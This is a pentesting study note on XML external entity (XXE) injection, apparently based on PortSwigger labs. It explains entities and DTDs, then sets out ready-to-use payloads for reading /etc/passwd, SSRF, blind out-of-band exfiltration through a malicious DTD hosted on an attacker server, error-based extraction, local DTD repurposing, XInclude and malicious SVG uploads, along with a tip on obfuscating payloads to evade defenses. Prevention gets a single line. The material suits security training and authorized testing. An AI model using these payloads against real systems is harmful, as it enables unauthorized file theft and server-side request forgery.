---
description: eXtensible Markup Language
---

# XXE

{% code overflow="wrap" fullWidth="true" %}
```
https://airman604.medium.com/from-xxe-to-rce-with-php-expect-the-missing-link-a18c265ea4c7
https://gosecure.github.io/xxe-workshop
https://github.com/jbarone/xxelab
https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/#detect-the-vulnerability
https://portswigger.net/web-security/xxe
```
{% endcode %}

{% hint style="danger" %}
**XML tags are case sensitive**. All XML elements must be properly nested. All XML documents must have a root element. Attribute values must always be quoted.
{% endhint %}

## What is XML?

XML stands for "extensible markup language". XML is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data.

## What are XML entities?

XML entities are a way of representing an item of data within an XML document, instead of using the data itself. For example, the entities `&lt;` and `&gt;` represent the characters `<` and `>`. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.

## What is document type definition?

The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional `DOCTYPE` element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.

## What are XML custom entities?

```
XML allows custom entities to be defined within the DTD. For example:         
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>             
Any usage of the entity reference &myentity within the XML document will be replaced with the value "my entity value"
```

## What are XML external entities?

```
XML external entities -> type of custom entity whose definition is located outside of the DTD where they are declared.   
The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity
should be loaded -> <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
# The URL can use the file:// protocol, and so external entities can be loaded from file.
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>       
```

## What is XML external entity injection?

XXE is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data -> view files, interact w/ back-end of external systems that the app itself can access.

In some situations -> XXE can be leveraged to SSRF to compromise the server.

## How do XXE vulnerabilities arise?

Some applications use the XML format to transmit data between the browser and the server. XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the app.

XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL.

## What are the types of XXE attacks?

* **Retrieve files**, where an external entity is defined containing the contents of a file, and returned in the application's response.
* **SSRF attacks**, where an external entity is defined based on a URL to a back-end system.
* [Exploiting blind XXE exfiltrate data out-of-band](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band), where sensitive data is transmitted from the application server to a system that the attacker controls.
* [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages), where the attacker can trigger a parsing error message containing sensitive data.

## Exploiting XXE to retrieve files

{% code overflow="wrap" fullWidth="true" %}
```xml
1. Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
2. Edit a data value in the XML that is returned in the app response, to make use of the defined external entity.
# Suppose a shopping app checks for the stock level of a product by submitting the following XML to the server: 
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
# No particular defenses against XXE attacks -> XXE to retrieve the /etc/passwd file:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
# This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file 
# and uses the entity within the productId value. This causes the app response to include the contents of the file
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
# NOTE: With real-world XXE vulns, there will often be a large number of data values -> test all and see response
```
{% endcode %}

## Exploiting XXE to perform SSRF attacks

{% code overflow="wrap" fullWidth="true" %}
```xml
You need to define an external XML entity using the URL that you want to target, and use the defined entity 
within a data value. If so -> you will be the response from the URL / if not -> you have blind SSRF attack
# Example of external entity causing HTTP request to a internal system:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```
{% endcode %}

## Blind XXE vulnerabilities

The app does not return the values of any defined external entities in its responses.

* Out-of-band techniques to find vulnerabilities and exploit them to exfiltrate data.
* Trigger XML parsing errors that lead to disclosure of sensitive data within error messages

### Detecting blind XXE using out-of-band (OAST) techniques

{% code overflow="wrap" fullWidth="true" %}
```xml
# Same for XXE SSRF attacks but triggering the out-of-band network interaction to a system that you control
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
This XXE attack causes the server to make a back-end HTTP request to the specified URL. 
Attacker can monitor the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful. 

############################## XML parameter entities
Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the app or some hardening
of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. 
XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. 
# The declaration of an XML parameter entity includes the percent character before the entity name:
<!ENTITY % myparameterentity "my parameter entity value" >
# Parameter entities are referenced using the percent character instead of the usual ampersand: 
%myparameterentity;
#  This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows: 
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```
{% endcode %}

### Exploiting blind XXE to exfiltrate data out-of-band

{% code overflow="wrap" fullWidth="true" %}
```xml
It involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD
from within the in-band XXE payload. 
# An example of a malicious DTD to exfiltrate the contents of the /etc/passwd file is as follows:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;

This DTD carries out the following steps:
    Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
    Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity 
  called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker web server
  containing the value of the file entity within the URL query string.
    Uses the eval entity, which causes the dynamic declaration of the exfiltrate entity to be performed.
    Uses the exfiltrate entity, so that its value is evaluated by requesting the specified URL.

#  The attacker must then host the malicious DTD on a system that they control, serving the malicious DTD like this:
http://web-attacker.com/malicious.dtd
#  Finally, the attacker must submit the following XXE payload to the vulnerable application:
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>

# NOTE: This technique might not work with some file contents, including the newline chars contained in /etc/passwd
# This is because some XML parsers fetch the URL in the external entity definition using an API that validates the
# characters that are allowed to appear within the URL. 
Sometimes, it will not be possible to exfiltrate data containing newline chars -> target /etc/hostname instead

# EXAMPLE: Exploiting blind XXE to exfiltrate data using a malicious external DTD
- Identify endpoint that sends XML data. See there are basic defenses against XXE.
- Write the following payload on the body part of the exploit server
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0a4300490371c8e78169109701e7002e.exploit-server.net/?x=%file;'>">
%eval;
%exfiltrate;
- Deliver the following payload on the vulnerable app
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a4300490371c8e78169109701e7002e.exploit-server.net/malicious.dtd"> %xxe;]>
- Visit exploit server access log to find the exfiltrated data
```
{% endcode %}

### Exploiting blind XXE to retrieve data via error messages

{% code overflow="wrap" fullWidth="true" %}
```sh
# Trigger an XML parsing error message containing the contents of the /etc/passwd file using a malicious external DTD:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

This DTD carries out the following steps:
  -  Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
  -  Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity 
     called error. The error entity will be evaluated by loading a nonexistent file whose name contains the value 
     of the file entity.
  - Uses the eval entity, which causes the dynamic declaration of the error entity to be performed.
  - Uses the error entity, so that its value is evaluated by attempting to load the nonexistent file, resulting
     in an error message containing the name of the nonexistent file, which is the contents of the /etc/passwd file.

# Invoking the malicious external DTD will result in an error message like the following:
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

# EXAMPLE: Exploiting blind XXE to retrieve data via error messages
- Identify endpoint that sends XML data. See there are basic defenses against XXE.
- Write the following payload on the body part of the exploit server
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
- Deliver the following payload on the vulnerable app
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM

"https://exploit-0a4300490371c8e78169109701e7002e.exploit-server.net/malicious.dtd"> %xxe;]>
- The server responds with an error, showing the specified file.
```
{% endcode %}

### Exploiting blind XXE by repurposing a local DTD

{% code overflow="wrap" fullWidth="true" %}
```xml
So what about blind XXE vulnerabilities when out-of-band interactions are blocked? 
You cannot exfiltrate data via an out-of-band connection, and you cannot load an external DTD from a remote server. 

In this situation, it might still be possible to trigger error messages containing sensitive data, due to a loophole
in the XML language specification. If a document DTD uses a hybrid of internal and external DTD declarations, then
the internal DTD can redefine entities that are declared in the external DTD. When this happens, the restriction
on using an XML parameter entity within the definition of another parameter entity is relaxed. 

An attacker can employ the error-based XXE technique from within an internal DTD, provided the XML parameter entity
that they use is redefining an entity that is declared within an external DTD.
If out-of-band connections are blocked -> invoke a DTD file from the local filesystem and repurpose it to redefine
an existing entity in a way that triggers a parsing error containing sensitive data. 

# Suppose there is a DTD file on the server filesystem at the location /usr/local/app/schema.dtd, and this DTD file
# defines an entity called custom_entity. We could trigger an XML parsing error message containing /etc/passwd file
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
This DTD carries out the following steps:
    - Defines an XML parameter entity local_dtd, w/ contents of the external DTD file exists on the server filesystem.
    - Redefines the XML parameter entity called custom_entity, which is already defined in the external DTD file.
    The entity is redefined as containing the error-based XXE exploit that was already described.
    - Uses the local_dtd entity, so that the external DTD is interpreted, including the redefined value 
    of the custom_entity entity. This results in the desired error message.

####################### Locating an existing DTD file to repurpose
Because the app returns any error messages thrown by the XML parser -> enumerate local DTD files by trying to load them
# Example: Linux using the GNOME desktop env often have a DTD file at /usr/share/yelp/dtd/docbookx.dtd -> try to load:
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
# It will cause an error if the file is missing
Steps:
1. Test a list of common DTD files to locate a file that is present
2. Obtain a copy of the file and review it to find an entity that you can redefine. Since many common systems 
that include DTD files are open source -> obtain a copy through internet search.

# EXAMPLE: Exploiting XXE to retrieve data by repurposing a local DTD
- Test a list of common DTD files to locate a file that is present
- Systems using GNOME desktop env -> DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
- Research a copy of the file and review it to find an entity that you can redefine
https://github.com/GNOME/yelp/blob/master/data/dtd/docbookx.dtd -> entity ISOamso for example
- Craft the payload to read /etc/passwd by repurposing the local DTD w/ entity ISOamso and triggering error-based XXE
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
{% endcode %}

## Finding hidden attack surface for XXE injection

{% code overflow="wrap" fullWidth="true" %}
```xml
Attack surface for XXE injection vulnerabilities seems obvious -> HTTP request in XML format
In other cases, the attack surface is less visible -> look in the right places to find XXE in requests w/ no XML

############################### XInclude attacks
Some apps receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. 
In this situation, you cannot carry out a classic XXE attack (no control of the entire XML document so no DOCTYPE)
Use XInclude instead. XInclude is a part of the XML specification that allows an XML doc to be built from sub-documents
You can place an XInclude attack within any data value in an XML document (e.g., where you only control a single item)
# XInclude attack -> reference the XInclude namespace and provide the path to the file that you wish to include
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
# EXAMPLE: Exploiting XInclude to retrieve files
- Locate parameters on HTTP request, for example: 
productId=1&storeId=1
- Try to place XInclude attack on parameters:
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">

<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1

############################# XXE attacks via file upload
Some apps allow users to upload files which are then processed server-side. Some common file formats use XML or
contain XML subcomponents. Examples: office document formats like DOCX and image formats like SVG. 
An app might allow image upload -> expects PNG/JPEG but image processing library used might support SVG images -> SVG
uses XML -> submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

############################# XXE attacks via modified content type
Most POST requests -> content type such as application/x-www-form-urlencoded but might tolerate others, including XML.
#  For example, if a normal request contains the following: 
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
#  Then you might be able submit the following request, with the same result:
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
# If the app tolerates requests containing XML in the message body, and parses the body content as XML -> XXE attack
```
{% endcode %}

## How to find and test for XXE vulnerabilities

* Testing for [file retrieval](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files) by defining an external entity based on a well-known operating system file.

•Testing for [blind XXE vulnerabilities](https://portswigger.net/web-security/xxe/blind) by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator)

* Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an [XInclude attack](https://portswigger.net/web-security/xxe#xinclude-attacks) to try to retrieve a well-known operating system file.

{% hint style="success" %}
Keep in mind that XML is just a data transfer format. Make sure you also test any XML-based functionality for other vulnerabilities like XSS AND SQLi. You may need to encode your payload using XML escape sequences to avoid breaking the syntax, but you may also be able to use this to [obfuscate your attack](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding) in order to bypass weak defenses.
{% endhint %}

## How to prevent XXE vulnerabilities

* Disable dangerous XML features (resolution of external entities and disable support for `XInclude`).
